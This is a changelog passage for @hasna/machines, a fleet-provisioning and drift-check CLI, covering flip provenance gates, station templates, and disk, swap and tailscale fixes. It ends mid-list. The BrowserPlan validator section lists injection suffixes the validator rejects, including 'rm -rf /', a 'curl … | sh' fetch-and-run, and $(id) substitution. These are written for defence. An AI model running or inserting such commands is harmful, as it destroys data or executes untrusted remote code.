# Changelog

## 0.2.39

### Patch Changes

- Switch @hasna/machines local path reads/writes through the @hasna/paths resolver (XDG/macOS home layout, hotfixes plan 0f49f56a task P3.3). The legacy `~/.hasna/machines` data root (with the `HASNA_MACHINES_HOME` / `MACHINES_HOME` exact-app overrides layered on top of the pre-existing `HASNA_MACHINES_DIR`) stays the effective data root until the store has actually been migrated to the XDG data home (`machines.db` present there) or the operator sets the data-kind override `HASNA_DATA_HOME` — an existing live store never becomes invisible on upgrade. The per-file `HASNA_MACHINES_*_PATH` overrides are preserved and layered on top. The install-time postinstall now provisions the same effective data root the runtime resolves instead of hardcoding `$HOME/.hasna/machines`. Nothing moves on disk in this phase.

## 0.2.38

### Patch Changes

- P1-C flip provenance gates + per-run ledger (todos 0c0324c1): `machines flip`
  now proves the freshly written `~/.hasna/fleet-env/<app>.env` supplied the
  connection before reporting ok. Provenance gates reject `apiKeyTier=legacy-env`,
  any reported transport/apiUrl/apiKey source under `~/.hasna/cloud`, and api mode
  whose exact source cannot be reported. The flip script reports the sha256 of the
  env file it wrote (`FLIP_SHA256`), and every flip writes one value-free JSONL
  ledger row per machine to `~/.hasna/machines/flip-ledger.jsonl` (ts, machine,
  app, wave, mode, result, sourceOfValue, envSha256, provenanceOk); dry-runs
  return the rows in the report but never write the file. `docs/FLEET-FLIP.md`
  updated to the fleet-env primary location (the `~/.hasna/cloud` writing is
  retired).

- Release-review P1 remediation (2026-08-26, publish-all review): provenance
  gates now extract per-app against the REAL status shapes instead of synthetic
  top-level fields — emails reports its source at `mode.source.name`, todos at
  `remote_authority.api_url_source` / `api_key_source`, and contracts-based apps
  keep the client-transport top-level fields. The shared resolver gained genuine
  fleet-env support: `~/.hasna/fleet-env/<app>.env` is the PRIMARY disk tier in
  `@hasna/contracts` credential resolution (reported as the source path), and the
  todos and emails resolvers read it too, so a flipped machine proves the file
  supplied the connection in silent shells. The flip script also emits a
  machine-level probe of the service unit's `EnvironmentFiles` (`FLIP_UNIT_ENVFILES`)
  so the EnvironmentFile path is provable even when the app reports plain env-key
  names. `FLIP_SHA256` is now required for an api-mode ok. `flip revert --execute`
  writes ledger rows through the same sink as apply (one row per attempted target),
  and a ledger preflight opens the ledger for append BEFORE any machine is touched
  — an unwritable ledger aborts the flip before the first remote mutation.

- Updated dependencies [cycle-2 review remediation]
  - @hasna/contracts@0.14.2 (the release that ships the fleet-env primary disk
    layer the flip's provenance gates rely on)

## 0.2.37

### Patch Changes

- Updated dependencies [85a5e06]
  - @hasna/contracts@0.14.1

## 0.2.36

### Patch Changes

- Add the aggregate workstation test profile (`machines.workstation_test_profile.v1`): a systemd-cgroup-v2 controller (cpu/memory/pids delegation required) with an aggregate `hasna-tests.slice` bounding memory, swap, and task counts for admitted local test scopes, plus the `workstationTestProfile` station-template flag.
- Drop the storage-mode variable from deployment artifacts: docker-compose.yml no longer sets `HASNA_MACHINES_STORAGE_MODE` (the last residue sites of the retired deployment-modes doctrine), so the serve container no longer throws under the fail-loud legacy-storage-mode guard.
- Updated dependencies [6176948]
- Updated dependencies [7575de8]
  - @hasna/contracts@0.14.0

## 0.2.35

### Patch Changes

- Release-gate remediation: the per-package bun.lock is synced to the pinned @hasna/contracts 0.13.4 (frozen install in the Docker deps stage), and the shipped station template floors @hasna/machines at 0.2.35, the version this template ships with.
- Updated dependencies [554a5b9]
  - @hasna/contracts@0.13.4

## 0.2.34

### Patch Changes

- d7d615b: Align hasna.contract.json kitVersion to the pinned @hasna/contracts version 0.13.3 (the pin moved to 0.13.3 in the ship-latest wave). Todos d175d558.
- Release-review P1 remediation: the shipped station template floors @hasna/machines at 0.2.34, the version this template ships with.
- Release-gate remediation: resolveCloudStorage now calls the retired storage-mode guard (assertNoLegacyStorageMode) on the env it is given, so a set HASNA_MACHINES_STORAGE_MODE / MACHINES_MODE variable throws naming the variable instead of being silently ignored — the guard existed but was never wired into the client resolver.
  - @hasna/contracts@0.13.3

## 0.2.33

### Patch Changes

- Updated dependencies [5e32853]
  - @hasna/contracts@0.13.2

## 0.2.32

### Patch Changes

- @hasna/contracts@0.13.1

## 0.2.31

### Patch Changes

- aa09414: Committed export-map declarations (types/) plus an install-time prepare build so workspace-linked consumers (loops, dispatch) resolve @hasna/machines/consumer and the other declared subpaths in a fresh checkout — fixes the deterministic TS2307 at install for wave #670's workspace alignment.
- 0d7a2d6: fix(machines): every api-mode fleet flip (re)provision verifies the written env file carries the full per-app env contract (default [apiUrlEnv, apiKeyEnv], overridable via clientEnvRequiredKeys) and aborts with FLIP_ERROR (exit 3) BEFORE the file becomes the provisioned state when any required key is missing. Incident 715712 (BUG 7d5f08a1): a harness session-env re-provision dropped the hosted API env for TODOS/KNOWLEDGE/EMAILS and the CLIs silently fell back to empty on-box SQLite stores at rc=0 — a re-provision can never emit a reduced env again.
- Updated dependencies [d5b64f8]
- Updated dependencies [1da0550]
  - @hasna/contracts@0.13.0

## 0.2.30

### Patch Changes

- 1413b5e: Generated Bun package probes (`machines apps plan`/`apply`) now execute under an explicit `bash -c` wrapper, fixing `zsh:1: parse error near 'printf'` on macOS targets whose remote login shell is zsh — installs ran but verification always failed (bug e406620f, measured station03). The output contract is unchanged and linux targets keep working. Shipped as 0.2.27 with the station-template floor bump.
- Updated dependencies [b630c48]
  - @hasna/contracts@0.11.2
  - @hasna/events@0.1.16

All notable changes to `@hasna/machines` are documented here. The format is
based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this
project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## 0.2.29

### Added

- `machines flip` registers `emails` so the hosted-mailbox route rolls fleet-wide
  with every other app; `mailery` is removed from the registry (retired upstream,
  never a client flips host). Emails is the first app with a per-app profile
  override: it writes `EMAILS_SELF_HOSTED_URL` + `EMAILS_CLIENT_ENV_SECRET` (a
  Vault pointer the emails CLI resolves itself) instead of the generic
  `HASNA_EMAILS_API_URL`/`HASNA_EMAILS_API_KEY`, so no literal key is materialised
  on disk, and its status verifier reads `mode.current` from
  `emails status --json` (PR #645).

## 0.2.28

### Added

- `machines cloud-loader` command: station cloud-env loader probe (e7d360237).

### Changed

- Display name is now "Hasna Machines" (open- prefix retired). Consumer identity
  literals emit the canonical `machines` values, and the v1 consumer schema
  accepts the legacy `open-machines` values on read so existing v1 consumers
  keep validating stored/legacy data (f45d1e4ed).
- Note machine-context source aliases are normalized on read: legacy
  `open-notes`/`open-machines` values map to canonical `notes`/`machines`
  (e63a442e5).
- Station template Bun install floor bumped to 0.2.28 (d20456352).

### Fixed

- CI publish-guard and standard gates reconciled with current main (ef92791e4).

## [0.2.27] - 2026-08-15

### Fixed

- Generated Bun package probes (`machines apps plan`/`apply`) now execute under
  an explicit `bash -c` wrapper, so the probe script parses on macOS targets
  whose remote login shell is zsh. Previously the multi-line bash probe was
  parsed by the login shell directly and failed with `zsh:1: parse error near
'printf'`, so installs ran but verification always failed on macOS (bug task
  e406620f; measured on station03). Linux targets are unaffected.

## [0.2.26] - 2026-08-14

### Fixed

- Removed deployment-mode storage vocabulary and `deploymentMode(s)` branching
  from machine manifests and the station template (owner directive 2026-07-29;
  todos 7abbf333, PR #124).

## [Unreleased]

Station template 1.7.0 -> 1.8.0. No package version is claimed here: the
release bump belongs to a `chore(release)` PR, and the 0.3.0 this work
originally announced was never published (npm latest is 0.2.10).

Three defects, all in the drift check, all with the same shape: the check
reported success about things it had not actually established.

### Fixed

- Custom app manifests can now declare separate exact install and probe
  commands, with optional expected-version matching. Incomplete or malformed
  probe contracts fail closed, while existing custom `packageName` entries and
  apt, brew, cask, and winget behavior remain compatible.

### Changed

- **BREAKING — `setup --check` exit codes: `0` clean / `1` findings / `2`
  incomplete** (defect 2bfe61b0). It previously exited 0 whether the verdict
  was `clean` or `drift`, so it was structurally unable to fail: every caller
  in the fleet parsed the JSON `verdict` and recorded `check_rc=0 (NOT
trusted)`. A check that cannot fail is not a gate. Findings outrank
  incompleteness; `2` exists because a check with `skipped` items has not
  proven the box clean, it has proven it could not look. `--no-fail-on-findings`
  restores the old always-0 behaviour for callers not ready to move — it
  silences the exit code, not the report. **Blast radius:** any caller treating
  a non-zero rc as "the command itself failed". The JSON is unchanged and is
  still the richer answer, because it names which item failed.

  The numbers, and the opt-out flag name, match the `0 clean / 1 findings /
2 incomplete` contract on the table for `todos doctor` (task 71f7faba). That
  contract is scoped to the todos CLI and has not landed, so it does not bind
  this one; conforming avoids a second numeric convention in the same estate.

- **BREAKING — `packages.bun` entries are `{ name, minVersion }`, and the
  version is now judged** (template 1.7.0 → 1.8.0). `package:bun:*` reported
  `ok` when the package was present at ANY version, across 12 of the 42 items,
  so a station carrying a CLI from before a fix read identical to one updated
  an hour ago. The defect was pinned by a test asserting a 9.9.9 fixture was
  `ok`; that assertion is inverted, not deleted. `minVersion` is a FLOOR, never
  a pin — newer is `ok`, and the renders still install latest. An unreadable or
  non-semver version is `drift`, never `ok`. The bare-string form still loads
  for out-of-tree templates but carries no floor and says so in the item
  detail. Each shipped floor is the version published 2026-07-31.
  **Expect existing stations to go red on this axis: that is the fix working.**
  `EffectiveTemplate.packages.bun` changes type from `string[]`.

### Added

- **Declared absences — `absences`, and the ec2 overlay declares tailscale
  absent.** The owner ruling of 2026-07-30 removed tailscale from AWS stations;
  the implementation of it deleted the check along with the config and left the
  ruling claimed but unasserted. `check.ts` guarded its whole tailscale block on
  `effective.tailscale?.join`, so an EC2 render emitted no tailscale item at all
  (measured 2026-07-30 22:02Z: `tailscale_items=[]`), and a station18 running a
  LIVE tailscale with `BackendState=Running` still read clean 42/42. An absence
  nothing checks is a claim, not a control.

  This is deliberately **not** a `tailscale:join` check — asking whether the
  tailnet is healthy on a box that must not be on one is noise, and noise is how
  real drift gets ignored. The item asks "is it here?" and any yes is a
  `violation` (`setup --apply` does not uninstall, so re-running setup cannot
  converge it). An absence whose command/service could not be probed reports
  `skipped`, never `ok`. A layer set that both requires and forbids the same
  thing is refused at load time, so the ruling's narrow future exception — one
  AWS box granted tailscale — must be written into that box's overlay rather
  than reached by deleting a check. Physical classes are untouched: `dgx-spark`
  keeps `tailscale:join` and gets no absence item.

## [0.2.26] - 2026-08-15

## [0.2.25] - 2026-08-14

### Fixed

- Legacy machine aliases now resolve to canonical station entries across
  manifest, topology, project, app, workspace, diagnostics, notes, and screen
  consumers, including Tailscale peers that advertise only a retained alias.

## [0.2.24] - 2026-08-14

### Fixed

- `apps apply` now runs every declared custom app probe after installation,
  failing closed when the active owner or expected version is not verified.

## [0.2.23] - 2026-08-13

### Fixed

- `apps apply` now compares canonical executable identity when verifying a
  manager-owned Bun install, accepting symlink-equivalent PATH entries while
  reporting a true owner/PATH collision explicitly.

## [0.2.22] - 2026-08-13

### Fixed

- Legacy manifests with top-level `heartbeatAliases` now load through the
  compatibility boundary by moving aliases into `metadata`, while unrelated
  unknown manifest keys remain rejected.

## [0.2.21] - 2026-08-13

### Fixed

- Exact Bun package installs now pin `bun install -g name@version`, and the
  version probe strips the first semver token from CLI banners and build
  metadata before verifying the installed package version.

## [0.2.20] - 2026-08-10

### Fixed

- Permit the package-built exact Bun bootstrap to execute one exact
  `@hasna/machines` self-upgrade transaction while retaining the existing
  `@hasnaxyz/infinity` then `@hasnaxyz/factory` transaction order, package and
  selector identity checks, immutable source verification, byte-preimage
  rollback, and structured probes. Target Bun policies may contain additional
  quarantine exclusions only when all required exact exclusions remain and
  `minimumReleaseAge` is still 604800; an omitted registry resolves to Bun's
  canonical npm default, while explicit alternate registries still fail.

## [0.2.19] - 2026-08-10

### Added

- Add a target-only exact Bun registry candidate contract and safe two-step
  plan for `@hasnaxyz/infinity@1.0.12` followed by
  `@hasnaxyz/factory@0.6.9`. Machines verifies one immutable installer source,
  forwards its bytes only through bounded executor stdin, consumes the two
  station-local npm credential references only through nested `secrets exec`,
  validates Bun registry/quarantine/lock provenance and package-specific SDK
  and CLI probes, and restores the byte preimage for the complete pair on any
  failure. Existing app and reconcile behavior remains unchanged for manifests
  without this opt-in contract.

## [0.2.18] - 2026-08-09

### Added

- `machines exec` runs bounded local or remote commands through the package-owned
  runner with required `--machine` and `--timeout-ms`, argv or `--script` stdin
  input, scoped mutation approval bound to the exact command, separate capped
  stdout/stderr, propagated exit codes, and redacted output.

## [0.2.17] - 2026-08-09

### Fixed

- Preserve PATH during remote zsh command-version probes, so Bun-installed
  CLIs and the remote `@hasna/machines` version report their actual versions
  instead of `missing`.

Task `2ea60467-1c68-49e1-bcfa-dff5a28f3047`; [PR #81](https://github.com/hasna/machines/pull/81).

## [0.2.16] - 2026-08-09

### Fixed

- Custom app manifests can now declare separate exact install and probe
  commands, with optional expected-version matching. Incomplete or malformed
  probe contracts fail closed, while existing custom `packageName` entries and
  apt, brew, cask, and winget behavior remain compatible.

Fixes OPE34-00017 via PR #77.

## [0.2.15] - 2026-08-09

### Fixed

- Resolve registry-backed machines through the consumer-safe details surfaces,
  while keeping registry lifecycle metadata separate from heartbeat-backed
  liveness. Registry-only machines remain known with neutral live status,
  heartbeat-backed machines retain their fresh status, and absent identifiers
  remain explicit unknowns.

Fixes OPE34-00015 via PR #75.

## [0.2.13] - 2026-08-08

### Fixed

- Preserve `unavailable` compatibility results when remote execution fails before authenticated inspection, while keeping genuine authenticated empty-path results classified as missing.
- Preserve BrowserPlan unavailable state during reconciliation and route validation.

Fixes OPE69-00017 via PR #70.

## [0.2.9] - 2026-07-30

### Added

- **`journald-dropin` template file kind + base-layer journal size cap**
  (template 1.5.0 → 1.6.0). station17 build 2 (2026-07-29) died of disk
  exhaustion with journald logging "Failed to create new system journal: No
  space left on device" — yet the rebuilt stations shipped with a stock
  `journald.conf`, an absent `journald.conf.d`, and NO drift item covering
  the axis (found by the 2026-07-30 item-4 box audit; re-measured on both
  station17 and station18 with a positive control). The bound in force was
  the accidental journald default of min(10% of the filesystem, 4G) — "max
  4.0G" measured in both boxes' own journald startup lines. The base layer
  now ships
  `/etc/systemd/journald.conf.d/99-zz-hasna-station.conf` with
  `SystemMaxUse=2G` (two orders of magnitude above the measured 16M of use)
  and `SystemKeepFree=8G` (mirrors the ec2 overlay's `disk.minFreeGb` floor,
  so journald backs off before the drift-checked free-space floor is
  breached). Both renders restart `systemd-journald` after writing the
  drop-in — journald reads config only at start, so a written-but-unrestarted
  cap is on disk but not in force. The drift check covers the axis twice:
  the automatic byte-exact `file:journald-cap` item, and new semantic
  `journald:<Directive>` items that compute the EFFECTIVE value across the
  /etc stock conf plus sorted drop-ins with systemd merge semantics — so a
  later-sorting override drop-in that defeats the cap is named
  expected-vs-found rather than slipping past the byte check. The kind is
  ordering-sensitive (`99-zz-` prefix enforced at load), since
  `journald.conf.d` is lexicographic and later files win.

## [0.2.8] - 2026-07-30

### Added

- **`bashrc-block` template file kind + base-layer `~/.bashrc` non-interactive
  PATH block** (template 1.4.0 → 1.5.0). Measured on station17 2026-07-30:
  `mosh station17 codewith` — and every `ssh stationN <cmd>` — resolved no
  bun-installed CLI. Those shells are NON-LOGIN and NON-INTERACTIVE, so the
  0.2.7 profile.d fix never runs for them, and the sshd-spawned bash sources
  `~/.bashrc` INSTEAD of `$BASH_ENV` (verified: with `~/.bashrc` hidden and
  sshd `SetEnv` pointing `BASH_ENV` at the PATH profile, resolution still
  failed). The only hook those shells read is `~/.bashrc` ABOVE the stock
  early-return guard, so the new kind splices a marker-delimited block there —
  idempotent, drift-healing, never whole-file (the file is user-owned and
  machine-varied; a cloud-init `write_files` entry would clobber it). The
  drift check requires the block verbatim AND positioned before the guard;
  present-but-after-guard is a violation, not drift. Block content rides
  base64 inside a single-line command in both renders (a literal newline in a
  runcmd double-quoted YAML scalar is invalid YAML).

## [0.2.7] - 2026-07-30

### Added

- **`/etc/profile.d/99-zz-hasna-station-path.sh` in the template base layer**
  (template 1.3.0 → 1.4.0). Measured on station17 build 3:
  `sudo -iu hasna bash -lc 'machines --version'` exited 127 — Ubuntu's stock
  `~/.bashrc` early-returns for non-interactive shells before bun's PATH
  export, so SSM-driven automation could not find any bun-installed CLI and
  `command:aws-cli` went red under a PATH lacking /usr/local/bin. The
  profile.d file puts `/usr/local/bin` and `$HOME/.bun/bin` on PATH for every
  login shell regardless of interactivity; content-drift is caught by the
  existing file machinery (`file:path-profile`).
- **Security-group doctrine documented** (docs/station-template.md): the
  per-station SG stays in the launch set, EMPTY as its expected steady state
  — it is the pre-attached hook for the single argued-for exception the
  2026-07-30 ruling allows — tagged `Purpose=per-station-exception-hook`;
  all fleet-wide rules live on `stations-prod-fleet-sg`.

## [0.2.6] - 2026-07-30

### Added

- GitHub Actions CI now runs typechecking and the test suite on pull requests
  and pushes to `main`.

### Fixed

- Dashboard servers now preserve an explicit ephemeral port (`port: 0`),
  keeping server tests isolated in CI.
- **Swap guard reads `/proc/swaps`, not a PATH-resolved `swapon`** (0.2.5
  review P2-B). A login shell whose PATH lacks `/usr/sbin` failed the old
  guard open and deleted a LIVE swapfile before re-allocating 8G against a
  kernel-held unlinked inode — the ENOSPC class the guard exists to prevent.
  The kernel file needs no PATH lookup and no privilege; regression test runs
  the rendered entry on a PATH without /usr/sbin.
- **Unmeasurable free space is named as such** (P3-A): a broken `df` now
  leaves the swapfile untouched and warns "could not measure", instead of
  removing the file and claiming "insufficient headroom".
- **fstab dedupe matches any whitespace** (P3-B) — tab-delimited entries no
  longer get duplicated.
- Removed a stray 1010-line `pnpm-lock.yaml` committed by mistake in 313462a
  (P2-A) and gitignored foreign lockfiles in this Bun-first repo. It was never
  in the npm tarball and holds no secrets.

### Changed

- **Base-layer tailscale is refused by the schema** (P3-D): "structurally
  unreachable from an EC2 render" is now a load-time guarantee, not only a
  test assertion — a template with `base.tailscale` or a base `tailscaled`
  service fails to load, naming the 2026-07-30 ruling. The absence-assertion
  positive control now plants into the ec2 overlay (the schema-legal opt-in
  path).
- The swapfile path is a single exported constant (`SWAP_FILE_PATH`, P3-C);
  `swap:size` still deliberately sums all of `/proc/swaps`.
- `disk:root` ok-detail explains the 90% filesystem-overhead tolerance, so
  "61.0G, floor 64G" no longer reads like a near-miss (station17 build 3
  operator feedback).

## [0.2.5] - 2026-07-30

### Changed

- **No tailscale on AWS stations** (owner ruling 2026-07-30, supersedes the
  2026-07-29 "never boot-critical" ruling). The `tailscale` block and the
  `tailscaled` service moved from the station template's `base` layer into the
  `dgx-spark` physical overlay: a `station,ec2` render now contains no
  tailscale install, no join, and no auth-key fetch — nothing on the EC2 boot
  path fetches a secret at all — and the EC2 drift report carries no
  `tailscale:join` item in any status. Asserted in tests with a positive
  control that plants tailscale into a copied template and proves the absence
  assertions go red. Physical classes keep tailscale unchanged (routing, not
  deletion); SSM (the ec2 `accessFloor`, unchanged from 0.2.4) is the whole
  access path for cloud stations. Template version 1.1.0 → 1.2.0.

### Added

- **`disk.minFreeGb` free-space floor** (ec2: 8), reported as `disk:free`
  drift. Measured on build 2: at hard-0 bytes free the SSM agent could not
  write its orchestration files and returned EMPTY output instead of errors —
  a full disk silently degrades the only access path, so the drift check now
  names it while there is still room to act.
- **`disk.rootMinGb` root-volume floor** (ec2: 64). station17 build 2
  (`i-0f522f0138a0411e1`, 2026-07-29) launched on the 8G AMI-default gp3 root
  volume; the overlay's `fallocate -l 8G` swapfile allocated 4.2G until
  ENOSPC, filled `/` to 364K free, took journald down, and failed
  `cloud-final` 43.8s into `modules-final`. The launcher must request the
  declared size explicitly; the drift check reads `df -kP` and reports an
  undersized root as a `disk:root` **violation**, since setup cannot converge
  it — the fix is a relaunch.

### Fixed

- **Swapfile creation is convergent, space-guarded, and never fatal** in both
  renders. The old `test -f /swapfile ||` guard treated build 2's partial
  fallocate leftover as success forever (file present, `swapon --show` empty).
  The guard is now _active_ swap; a stale/partial file is removed before
  retrying; allocation is refused with a loud `NON-FATAL` warning unless
  `sizeGb + 2G` of headroom is free; the fstab entry is deduplicated.

## [0.2.4] - 2026-07-29

### Changed

- **Tailscale is never boot-critical** (owner ruling 2026-07-29, PR #37). The
  station template now declares a schema-level `accessFloor` (service +
  idempotent ensure + lesson); the `ec2` overlay declares the snap SSM agent as
  its floor, and both renderers (cloud-init and physical setup) emit the floor's
  ensure first and non-fatally. Physical layers declare no floor — their access
  floor is out-of-band.
- The tailscale join is non-fatal in both renderers: a failed auth-key fetch or
  `tailscale up` (station17's exact failure mode, `runcmd: 8: aws: not found`)
  can no longer abort a boot or a setup plan. The failure is loud — a `NON-FATAL`
  warning on stderr — and the drift check reports the unjoined station as
  `tailscale:join` drift, so the non-fatal join cannot become a silent one. A
  down access-floor service is reported as a `violation` naming the stranding
  risk.

### Fixed

- The old cloud-init join entry silently masked its exit code (`; rm -f` after
  `tailscale up` made the entry always exit 0), and leaked `umask 077` into
  later runcmd entries. The join is now a scoped subshell with an explicit
  `||` warning.

## [0.2.3] - 2026-07-29

### Added

- **Station template v1 (`hasna.station_template.v1`)** — a versioned, layered
  station contract (`templates/station/template.json`) with two renderers over
  one source: `machines setup --template station,dgx-spark` for physical boxes
  and `machines setup --template station,ec2 --render cloud-init --station
<name>` for EC2 user-data. Every template item carries a `lesson` field naming
  the measured 2026-07-28 station01 failure it exists to prevent.
- **Read-only drift check** — `machines setup --template <spec> --check` emits a
  JSON verdict (`clean` / `drift`) without mutating anything: file sha256,
  `/proc/sys` runtime values, MGLRU runtime value, apt packages, services, unit
  conventions (StartLimit values, `OnFailure` target, absolute `ExecStart`, with
  systemd drop-in reset semantics honoured), and the ordering rule — a managed
  sysctl file must sort last among the files defining its keys, which is the
  exact bug that shipped on 2026-07-28. `--check` refuses `--machine <other>`
  rather than reporting the local box under a remote name.
- Release gate now asserts the station template ships in the tarball, so
  `templates/` cannot silently fall out of the published package.

### Changed

- **BREAKING: retired deployment-mode vocabulary is rejected, not remapped.**
  `self_hosted`, `self-hosted`, `remote` and `hybrid` now throw with an error
  naming the fix. `HASNA_MACHINES_STORAGE_MODE` / `MACHINES_STORAGE_MODE` accept
  exactly `local` or `cloud`; `machines flip --mode` accepts `api` or `local`
  (`FlipMode` is `api | local`); `hasna.contract.json` no longer declares a
  client `mode`. `getStorageMode()` no longer infers `hybrid` from the presence
  of a `DATABASE_URL` — a DSN is a pointer, not a mode, and the default is now
  `local`. Sync push/pull was always gated on the DSN rather than the mode, so
  no sync behaviour changes; only the `mode` field of `machines storage status`
  moves.

### Fixed

- `buildFlipScript` no longer discards stderr on both attempts of its
  `secrets get` fallback, so cross-machine key provisioning failures are visible
  on the remote box where they happen.

- **BrowserPlan `app_install_update` no longer depends on a git checkout.** The
  hook's `command_template` was
  `cd <open-chrome-project-root> && git pull --ff-only origin main && bun install
--frozen-lockfile`, which cannot survive the owner-authorised retirement of the
  BrowserPlan source repository. It is now
  `bun install -g @hasna/open-chrome@0.1.0`, installing from the npm package that
  ships the `browserplan` bin. `command_placeholders` becomes `[]` and
  `required_capabilities` drops `git` (installing from npm needs only `bun`), so
  machines without git are no longer reported as blocked for this hook.

  The version is **deliberately pinned rather than a floating `latest`** — see
  `BROWSERPLAN_PINNED_VERSION`, and please do not "improve" it back. The decisive
  reason is **auditability**: the published metadata carries
  `gitHead: f49b5c42…`, which resolves to nothing once the source repository is
  retired, so if a floating tag ever moved after that point there would be no
  diff, no history and no provenance to inspect — and this hook installs it
  silently. A pin also gives `machines reconcile` something to verify, since it
  asserts `<bin> --version` equals the target, which only works against an exact
  version. Secondarily, npm becomes the sole artifact (one version, raw
  TypeScript, no maintainer watching the name), so a moved dist-tag would reach
  every fleet machine through a `bun install -g`. The usual argument for a
  floating tag — that a pin cannot deliver a future fix — costs nothing here,
  because republishing requires someone to deliberately hold the source mirror,
  and that same change can bump the constant. `dist-tags` is
  `{"latest":"0.1.0"}` today, so the pin currently costs nothing at all.

  No version _placeholder_ is exposed either, because **nothing in this package
  could resolve one**: `getPackageVersion()` returns _machines_' own version, and
  unlike `machines reconcile` — which pins versions from the fleet manifest — the
  hook contract has no version source of truth. The template is directly runnable
  as emitted.

- **Disclosure: 3 of the 8 advertised hook commands are non-functional in the
  shipped artifact.** `@hasna/open-chrome@0.1.0` dispatches only
  `serve|settings|profile|machine|secrets|chrome ask|remote start`, so
  `browserplan browser status` (`daemon_status`), `browserplan tab list`
  (`tab_inventory`) and `browserplan remote status` (`supervisor_status`) print
  usage and **exit 0** while the payload still reports them `available: true,
readiness: "ready"` — so exit status cannot distinguish the no-op from success.
  This is pre-existing and not changed here (correcting it would mean touching the
  readiness contract) but it becomes materially more significant now that npm is
  the only artifact, so a consumer reading `readiness: "ready"` should know before
  building on it.

- **Disclosure, worse than the above: for `supervisor_status` the validator
  forbids the only command that works.** The emitted template is `browserplan
remote status …`, which `0.1.0` does not dispatch, while the long-standing rule
  at `src/consumer-schema.ts` **rejects** any `supervisor_status` template
  containing `remote start` — which is the _only_ `remote` subcommand `0.1.0`
  does dispatch. A consumer who diagnoses the broken command and corrects it
  therefore gets a validation failure for the fix. Left in place here because
  changing it is a consumer-visible validation change unrelated to the retirement,
  but it is a trap and is recorded as such.

  On the old template: it was already unlikely to succeed, but **not for the
  reason an earlier draft of this entry gave.** `<open-chrome-project-root>` does
  resolve — `machines browserplan fleet --json` returns a non-null
  `workspace.project_root` for all 11 target machines — but every one reports
  `project_root_source: "inferred"`, a derived path rather than a manifest
  mapping, and spot checks found no such directory on the machines examined.

### Compatibility

- **Consumers pinned to `@hasna/machines` <= 0.2.2 will reject the new
  `app_install_update` payload.** The 0.2.2 validator _requires_ the literal
  `<open-chrome-project-root>` token, which the new template does not contain, so
  an old validator reports `ok: false` with one `command_template` error per
  machine. `MACHINES_CONSUMER_CONTRACT_VERSION` is deliberately **left at `1`**:
  raising it would make consumers treat _every_ envelope as unsupported —
  the knowledge app's adapter (`src/machines.ts`, adapter contract version 1)
  reports `unsupported_contract_version` and returns `null` for topology, route
  and workspace payloads whose `schema_version` exceeds 1 — a far larger break
  than the one hook it does not read. A per-envelope version would not help
  either: `schema_version` is a single global constant stamped on all 28
  envelopes, and no consumer gates on a per-envelope one.

  No consumer validates the `browserplan_fleet` envelope: `open-loops` uses only
  `discoverMachineTopology` and `resolveMachineRoute`, `open-dispatch` loads the
  consumer purely for route resolution, and the knowledge app declares
  `validateMachinesConsumerEnvelope` as a one-parameter optional capability it
  never invokes. `hasna/identities` documents reading this envelope
  (`docs/browserplan.md`) but does not consume it.

### Release story

- This change **cannot ship from `package.json` at `0.2.2`** — that version is
  already published and `scripts/verify-release.ts` correctly refuses. A version
  bump is required before publishing, and the skew above is only closed once
  consumers move past it; merging alone does not close it.
- **Validation expands for every template any released version actually emits, and
  narrows only for hand-edited variants.** `validateMachinesConsumerEnvelope`
  accepts an `app_install_update` template that is either `bun install -g
@hasna/open-chrome@` followed by a bare npm version or dist-tag — so a caller may
  pin `…@0.1.0` rather than track `latest` — **or** exactly equals the legacy
  checkout template, so a payload cached from any version up to 0.2.2 keeps
  validating.

  Precisely, and not overstated: the legacy arm is exact equality, so _modified_
  legacy strings that 0.2.2 accepted are now refused — trailing or leading
  whitespace, a dropped `--frozen-lockfile`, an added flag, or `origin main`
  shortened to `origin`. No emitter produces those, and every template emitted by a
  released version validates, but the rule is stricter than 0.2.2 for hand-edited
  input rather than a pure superset of it.

  The version suffix is **end-anchored**, and that matters more than the prefix: a
  prefix-only check accepts anything appended after a valid install — `…@0.1.0 &&
rm -rf /`, `…@0.1.0; curl http://host/x.sh | sh`, `…@0.1.0; cd d && git pull`,
  `` `id` ``, `$(id)` — and an empty version. All rejected, as are git-based
  rewrites (`git fetch && git reset --hard`, `git -C <dir> pull`, `git clone`).
  This is an allowlist of command _shape_, not a `git pull` phrase denylist, which
  would have been trivially evadable.

  The suffix must be an **exact semver or a dist-tag of two or more characters**.
  Semver **ranges are rejected as a class**, not as an enumeration: the dist-tag
  arm forbids `.`, so `0`, `1.2`, `0.x`, `0*`, `^1.0.0`, `~1.0.0`, `x`, `X`, and
  every dotted form — `x.x`, `x.y`, `X.Y`, `x.`, `x..x`, `x.x.`, `x.x-`, `x.-`,
  `x.x_1`, `x.0.0` — all fail. A range makes the installed version unpredictable,
  defeating both the pin and reconcile's `<bin> --version` assertion, and `0*` is
  additionally a shell glob whose expansion depends on the caller's working
  directory.

  This was reached only after two narrower attempts leaked, and the reason is worth
  recording: **the resolver, not a character class, is the oracle.** Bun coerces far
  more than `x`-characters into "any version" — `bun add @hasna/open-chrome@x.y`
  exits 0 and installs `0.1.0`, and `x.y` contains no wildcard character at all.
  Note also that **bun and npm disagree**: `npm view @hasna/open-chrome@x.y
version` returns `E404` for the same spec bun happily resolves. The hook command
  is `bun install -g`, so bun is the oracle that matters.

  Residual, accepted knowingly: a dist-tag containing a dot would be rejected. npm
  dist-tags conventionally do not contain dots, and this rule governs exactly one
  package whose tags are `{"latest":"0.1.0"}`. Real tags — `latest`, `next`,
  `beta`, `canary`, `rc`, `nightly`, `lts`, `x86-64`, `xenial`, `x-ray` — and exact
  semver with prerelease and build metadata are all unaffected. The pattern is a shared module-level object and is
  asserted to carry **no flags**, since a `/g` added later would advance
  `lastIndex` between calls and return alternating results for successive machines
  in one payload. It is not a trust check: a legitimate but hostile-looking
  dist-tag such as `latest-evil` is accepted.

- Every other BrowserPlan surface is unchanged — owner ids, target name, machine
  ids, operation ids, stable surfaces — and
  `schemas/machines-consumer.schema.json` is byte-for-byte identical, because the
  emitted template is not constrained by the JSON Schema. **That artifact being
  unchanged is not evidence that consumers are unaffected**; see the validator
  skew above.

### Changed

- The BrowserPlan owner ids are now single named exports instead of literals
  repeated across the contract, the schema bundle, and the validators:
  `BROWSERPLAN_APP_ID`, `BROWSERPLAN_PACKAGE_NAME`, `BROWSERPLAN_CLI_COMMAND`,
  `BROWSERPLAN_ROUTE_OWNER`, `BROWSERPLAN_SECRETS_OWNER`, and
